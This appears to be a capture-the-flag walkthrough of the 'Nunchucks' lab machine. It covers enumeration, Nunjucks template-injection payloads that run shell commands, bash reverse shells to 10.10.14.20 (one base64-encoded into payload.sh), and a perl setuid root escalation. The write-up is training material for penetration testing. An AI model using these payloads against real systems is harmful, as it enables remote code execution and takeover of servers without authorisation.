1. Run Nmap to discover any open ports and services from the web server.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3b7b1e08-e98c-4497-9520-1f112bb70c54)

2. Try to open the ip address on the browser and get a domain nunchuks.htb. Add to **/etc/hosts/** so we can open the website.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/2004824b-ce1f-4e81-b032-03b5694d6474)

Website:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d4f64624-14ea-43cd-882b-7cdaaa998424)

3. Checking the Sign Up and Log In feature and can't use both of them.
Signup:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/85432824-3fef-4900-92b1-8b8eed99f263)

Login:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d2ddddb7-8d36-46b5-96d0-c720828e2f84)

4. Checking another website features and contents. In the footer, we found that 
![image](https://github.com/LawsonSchwantz/CTF-Writeups/assets/74954683/2977a9df-af8d-4698-bc24-d9f76fafe823)

5. `wfuzz -u https://nunchucks.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -H "Host: FUZZ.nunchucks.htb"`
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/4f8cd75a-ca63-49c0-8cff-550ce3fb036e)

6. `wfuzz -u https://nunchucks.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -H "Host: FUZZ.nunchucks.htb" --hh 30587`
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/28f5989e-71b7-4257-9394-780f84b122f0)

7.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e60ce229-8654-42f6-bcdc-6797d84481f0)

Website:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/37f1e264-4386-4eeb-bb4e-a72f5faf3b16)

8.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/270df8d4-f4d2-4757-b912-e22fabf99f97)

9.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/10ffb2b8-4c6b-4829-b01f-5e96c6dbb527)

10.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/36edf8ba-8383-4cb2-86db-b08aa8e204f3)

11. [Payload](https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml)

Payload:
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('insert any bash command')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/f3db7daf-cf4c-4761-a941-849ba8a5cd67)

12. [tool](https://www.revshells.com/)

payload:
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/10.10.14.20/777 0>&1"')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/bbe97c82-70a3-433d-90cd-2084bedeed2a)

13. `{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /home/david/user.txt')\")()}}@gmail.com`
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/425014a2-35de-46ff-996e-afb60f374550)

14.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1fab502a-8d7b-44eb-bf45-018bab675c40)

Payload:
`{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMC83NzcgMD4mMQo= | base64 -d > /home/david/payload.sh')\")()}}@gmail.com`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/0251335b-6203-4b99-b504-b6e2b677ce0a)

Check:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/346a8d55-47e0-4946-b135-c902735d1b7d)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/778f5dd5-384a-4892-909a-78ab6fd35ec1)

15. `{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash ~/payload.sh')\")()}}@gmail.com`
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6d8354fd-304e-4a1e-81d2-759249212bc6)

Host:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/8818ce95-fbbf-4c19-b656-1a28599721e5)

16.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/42fc94ce-8421-4285-a47c-32ae4b69d5a0)

17.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/303fe797-ef49-4dcb-81ae-785804ae8d70)

18. [web](https://gtfobins.github.io/gtfobins/perl/#capabilities)

Checking perl location:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/09cb1ea2-5587-451a-86b9-0c4ffcc96e24)

Payload:
`/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/9e7e5996-ca7a-46a7-bfa6-c8cccb2feb87)

19.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/f07731f3-52e7-4185-9d6a-b6f9f57229fd)

20. `echo '#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";' > root.pl`
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/05c7b034-7aab-4506-ae20-7a13e9f1a04c)

21.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d65db7ba-066e-434b-9423-40489e487a8a)

22.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/dc418505-95f3-4189-9d53-02b84c690307)






















